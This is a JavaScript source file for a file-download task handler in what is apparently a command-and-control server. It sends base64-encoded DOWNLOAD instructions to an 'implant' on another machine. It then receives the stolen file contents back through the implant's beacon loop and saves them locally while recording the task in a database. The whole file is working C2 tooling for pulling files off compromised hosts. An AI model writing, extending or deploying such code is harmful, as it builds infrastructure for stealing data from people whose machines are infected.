// Download Task Handler
// Sends: task_id:base64("DOWNLOAD:<base64(remote_path)>")
// Implant reads the file and responds with "FILE:<base64(file_data)>" or "ERR:<message>".
// The main beacon loop further base64-encodes the response, so req.body is
// base64("FILE:<b64(data)>") or base64("ERR:<message>").
import fs from 'fs'
export class TaskHandler {
  constructor(task) {
    this.task = task
  }

  getTask = async function (req, res) {
    const { remote_path } = JSON.parse(this.task.parameters)
    const payload     = `DOWNLOAD:${Buffer.from(remote_path).toString('base64')}`
    const instruction = `${this.task.id}:${Buffer.from(payload).toString('base64')}`
    const display     = `Download: ${remote_path}`
    db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
      .run({ task_id: this.task.id, display })
    this.task.display = display
    res.send(instruction)
  }

  taskIO = async function (req, res) {
    const { remote_path, local_path } = JSON.parse(this.task.parameters)
    // req.body is base64(implant_output); decode once to get the prefixed string
    const inner = Buffer.from(req.body, 'base64').toString('utf8')

    if (inner.startsWith('FILE:')) {
      const fileData = Buffer.from(inner.slice(5), 'base64')
      try {
        fs.writeFileSync(local_path, fileData)
        this.task.output = `Downloaded ${fileData.length} bytes: ${remote_path} → ${local_path}`
      } catch (e) {
        this.task.output = `C2 error: could not save ${local_path}: ${e.message}`
      }
    } else {
      // ERR: prefix or unexpected output — store as-is
      this.task.output = inner.startsWith('ERR:') ? inner.slice(4) : inner
    }

    this.task.completed_at = Date.now()
    db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
      .run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
    res.type('text/plain').send('success')
    io('task_complete', this.task)
    delete active_implant_handlers[this.task.id]
  }
}
